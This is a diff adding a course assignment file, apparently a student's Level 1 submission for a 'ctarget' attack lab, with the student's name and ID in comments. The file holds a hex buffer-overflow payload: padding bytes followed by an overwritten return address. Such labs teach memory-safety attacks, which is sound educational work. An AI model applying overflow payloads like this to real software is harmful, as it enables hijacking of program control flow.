@@ -1,0 +1,7 @@
+/* Name: Phillipp Cun */
+/* Hawk ID: pcun */
+/* Enter your Level 1 exploit string for ctarget in this file */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+50 1c 40 00 00 00 00 00
